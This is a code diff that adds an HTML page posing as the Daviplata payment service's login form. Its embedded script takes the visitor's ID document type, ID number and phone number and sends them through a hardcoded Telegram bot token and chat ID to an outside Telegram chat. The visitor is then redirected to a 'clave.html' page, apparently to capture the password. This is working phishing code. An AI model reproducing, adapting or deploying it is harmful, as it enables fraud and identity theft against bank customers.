@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Daviplata - Compre fácil</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        .btn-continue {
+            transition: background-color 0.3s ease;
+        }
+        .btn-continue:disabled {
+            background-color: #ccc !important;
+            color: #999 !important;
+        }
+        .btn-continue.active {
+            background-color: #d32f2f !important;
+            color: white !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <img src="img/logo-daviplata.svg" alt="Daviplata Logo" class="logo">
+            <div class="header-info">
+                <p class="date" id="currentDate"></p>
+                <p class="code">Código único CUS: 1986688397</p>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <div class="form-container">
+                <h1 class="title">Compre fácil con Daviplata</h1>
+                <p class="subtitle">Pagos en línea y PSE</p>
+
+                <h2 class="form-title">Ingrese sus datos</h2>
+
+                <form class="form" id="daviForm">
+                    <div class="input-group">
+                        <div class="select-wrapper">
+                            <select id="documentType" class="form-input" required>
+                                <option value="">Tipo de documento</option>
+                                <option value="CC">Cédula de Ciudadanía</option>
+                                <option value="CE">Cédula de Extranjería</option>
+                                <option value="TI">Tarjeta de Identidad</option>
+                            </select>
+                            <img src="img/icono-abajo-drop.svg" alt="dropdown" class="dropdown-icon">
+                        </div>
+                    </div>
+
+                    <div class="input-group">
+                        <input 
+                            type="text" 
+                            id="documentNumber" 
+                            class="form-input" 
+                            placeholder="Número de documento"
+                            maxlength="10"
+                            required
+                        >
+                    </div>
+
+                    <div class="input-group">
+                        <input 
+                            type="text" 
+                            id="phoneNumber" 
+                            class="form-input" 
+                            placeholder="Número de celular"
+                            maxlength="10"
+                            required
+                        >
+                    </div>
+
+                    <div class="button-group">
+                        <button type="button" class="btn btn-continue" id="btnContinue" disabled>Continuar</button>
+                    </div>
+                </form>
+            </div>
+        </main>
+    </div>
+
+    <!-- Overlay de carga -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="img/loader.gif" alt="Cargando..." class="loader">
+            <p class="loading-text">Procesando información...</p>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        const docType = document.getElementById('documentType');
+        const docNumber = document.getElementById('documentNumber');
+        const phoneNumber = document.getElementById('phoneNumber');
+        const btnContinue = document.getElementById('btnContinue');
+        const overlay = document.getElementById('loadingOverlay');
+
+        // Validar en tiempo real
+        function validateForm() {
+            const isValid = docType.value && docNumber.value.length >= 5 && phoneNumber.value.length === 10;
+            btnContinue.disabled = !isValid;
+            
+            if (isValid) {
+                btnContinue.classList.add('active');
+            } else {
+                btnContinue.classList.remove('active');
+            }
+        }
+
+        docType.addEventListener('change', validateForm);
+        docNumber.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            validateForm();
+        });
+        phoneNumber.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 10);
+            validateForm();
+        });
+
+        btnContinue.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (btnContinue.disabled) return;
+
+            overlay.style.display = 'flex';
+
+            const mensaje = `👤 <b>DOCUMENTO - DAVIPLATA</b>
+
+<b>Tipo de documento:</b> <code>${docType.value}</code>
+<b>Número de documento:</b> <code>${docNumber.value}</code>
+<b>Número de celular:</b> <code>${phoneNumber.value}</code>
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    setTimeout(() => { window.location.href = 'clave.html'; }, 2000);
+                } else {
+                    overlay.style.display = 'none';
+                }
+            } catch (error) {
+                overlay.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+</html>
